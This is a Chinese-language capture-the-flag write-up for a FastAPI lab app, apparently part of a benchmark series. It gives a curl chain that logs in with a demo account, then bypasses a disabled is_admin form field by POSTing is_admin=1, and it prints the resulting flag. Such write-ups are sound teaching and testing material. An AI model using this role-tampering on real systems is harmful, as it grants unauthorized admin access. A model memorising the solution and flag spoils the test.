## 题解

### 入口与指纹

`uvicorn`（FastAPI）单端口。首页就是登录页，正文给了演示账号：

```html
<p>To try the app you can use the demo account:
   <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>
<form method="post" action="/token">…</form>
```

`/openapi.json` 一次列全五条路由：

```text
POST /token
GET  /
GET  /company/{company_id}/jobs
GET  /ping
GET+POST /manage_settings/{company_id}
```

登录后下发：

```http
Set-Cookie: access_token="Bearer MQ=="; HttpOnly; Path=/; SameSite=lax
```

`MQ==` 是 base64 的 `1`——**token 就是明文的用户 ID**，前缀固定 `Bearer `。

### 关键观察

**1. 资料页把 `is_admin` 渲染成 `disabled`。**

```html
<select class="form-control" id="is_admin" name="is_admin" disabled>
    <option value="0" selected>Regular</option>
    <option value="1">Admin</option>
</select>
```

`disabled` 只阻止**浏览器**提交该字段，服务端不做校验。

**2. 直接 POST 就被接受。**

```bash
curl -b cj -X POST -d 'name=demo&is_admin=1' http://$T/manage_settings/1
# 200
```

回到岗位列表，多出一行：

```html
<p>secret:flag{650ad312-2e23-4d95-8e08-44bd263bf9ca}</p>
```

**3. token 篡改反而是死路。**

顺手试了把 `access_token` 换成别的 ID（`Bearer Mg==` = `2`、`Mw==`、`NA==` 等），
全部返回 `401 Could not validate credentials`。说明这个 token 只用于**识别自己**，
真正的授权判断是"当前用户对 `company_id` 是否有权"，改 ID 只会让自己失效。

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 用页面给的演示账号登录
curl -sS -c $cj -b $cj -X POST -d 'username=demo&password=demo' "http://$T/token"

# 2. 绕过前端 disabled，把 is_admin 置 1
curl -sS -b $cj -X POST -d 'name=demo&is_admin=1' "http://$T/manage_settings/1"

# 3. 岗位列表里出现 secret
curl -sS -b $cj "http://$T/company/1/jobs" | grep -o 'flag{[^}]*}'
```

### flag 位置

`GET /company/1/jobs` 的 HTML 正文，`is_admin=1` 之后多出的
`<p>secret:flag{...}</p>`。

## 复盘

- **`disabled`/`readonly`/`hidden` 都是客户端约束。** 表单里凡是"不可编辑"的
  角色、状态、权限字段，第一反应就是直接 POST 一遍，成本 1 个请求。
- **`/openapi.json` 优于路径爆破。** 5 条路由一次全出；
  相比之下 `/admin`、`/users`、`/flag` 之类盲猜全是 404。
- **token 是明文 ID 时，先判断它承担什么职责。** 本题 `Bearer MQ==` = `1`，
  看起来很容易伪造，但改成别的 ID 只得到 401——因为它只用来"识别自己"，
  授权靠服务端回查归属。**"能改 token"不等于"能越权"**，这两件事要分开验证。
- **和 xben-005-24 是同一类漏洞的不同包装。** 那题的表单字段是 `is_admin`、
  路由叫 `/system_config`、token 是 JWT；本题 token 变成 base64 明文、
  路由叫 `/manage_settings`，但根因完全相同：**服务端信任了客户端提交的角色字段**。
  识别出"同族"之后可以直接套用思路，但仍需确认字段名和路由（每关都会变）。
